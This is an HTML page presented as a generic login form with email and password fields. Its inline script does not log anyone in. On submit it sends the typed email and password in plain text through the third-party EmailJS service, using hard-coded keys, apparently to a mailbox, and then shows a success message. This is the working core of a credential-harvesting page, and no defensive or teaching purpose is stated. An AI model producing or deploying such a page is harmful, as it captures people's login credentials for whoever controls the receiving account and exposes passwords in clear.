<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <form id="login-form">
            <h1>Login</h1>
            <label for="email">Email:</label>
            <input type="email" id="email" name="email" required>
            
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required>
            
            <button type="submit">Submit</button>
        </form>
    </div>

    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
    <script>
       (function(){
          emailjs.init("2UKLz6sC6ao4HsHRj"); // Initialize EmailJS with your Public Key
       })();

       document.getElementById('login-form').addEventListener('submit', function(event) {
           event.preventDefault();

           // Collect the form data
           const email = document.getElementById('email').value;
           const password = document.getElementById('password').value;

           // Send the form data using EmailJS
           emailjs.send('service_ahkerhg', 'template_ow3qpdd', {
               email: email, // Match the variable name in the template
               password: password // Match the variable name in the template
           })
           .then(function(response) {
               console.log('SUCCESS!', response.status, response.text);
               alert('Form submitted successfully!');
           }, function(error) {
               console.log('FAILED...', error);
               alert('Failed to submit form. Please try again.');
           });
       });
    </script>
</body>
</html>
